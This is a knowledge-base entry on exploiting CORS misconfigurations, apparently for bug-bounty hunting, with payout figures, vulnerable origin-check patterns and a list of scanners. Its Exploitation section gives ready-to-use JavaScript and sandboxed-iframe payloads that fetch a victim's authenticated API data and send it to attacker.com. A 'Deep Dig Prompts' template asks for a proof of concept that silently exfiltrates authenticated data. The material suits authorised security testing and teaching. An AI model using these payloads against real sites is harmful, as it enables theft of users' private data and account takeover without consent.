---
id: "cors-misconfiguration"
title: "CORS Misconfiguration Exploitation"
type: "technique"
category: "web-application"
subcategory: "cors"
tags: ["cors", "cross-origin", "origin-reflection", "null-origin", "subdomain", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["csrf-modern", "account-takeover", "xss-techniques"]
updated: "2026-03-30"
---

## Overview

CORS misconfiguration allows attacker-controlled origins to read authenticated API responses. When `Access-Control-Allow-Origin` reflects attacker origins with `Access-Control-Allow-Credentials: true`, it's equivalent to a universal CSRF that can also READ responses. Payout: $500-$10k+.

## Vulnerability Patterns

### Origin Reflection (worst case)
```http
# Request
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=abc123

# Response
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

# Attacker can now read the response from evil.com
```

### Null Origin
```http
Origin: null
# Response: Access-Control-Allow-Origin: null
# Triggered via sandboxed iframes, data: URIs, file: protocol
```

### Subdomain Wildcard
```
# Trusts *.target.com
# If any subdomain has XSS → full CORS bypass
# Or via subdomain takeover
```

### Prefix/Suffix Match
```
# Target trusts origins ending in target.com
# evil-target.com passes the check
# eviltarget.com passes the check
# target.com.evil.com passes the check
```

### Pre-domain Wildcard
```
# Target trusts *.target.com but also accepts:
# Anything before target.com in the hostname
```

## Exploitation

```html
<!-- Steal authenticated API data -->
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Exfiltrate to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>

<!-- Null origin via sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    fetch('https://target.com/api/me', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>fetch('https://attacker.com/log?d='+encodeURIComponent(d)))
  </script>">
</iframe>
```

## Deep Dig Prompts

```
Given this API [list endpoints]:
1. Test each endpoint with Origin: https://evil.com and check ACAO header.
2. Test null origin, subdomain origins, prefix/suffix match.
3. If CORS is permissive with credentials, identify the highest-value endpoint (user data, tokens, admin info).
4. Craft a PoC that silently exfiltrates authenticated data.
5. Chain with subdomain XSS or takeover for wildcard trust exploitation.
```

## Tools

- **Corsy** — CORS misconfiguration scanner
- **CORScanner** — Automated CORS testing
- **Burp Suite** — Manual Origin header manipulation
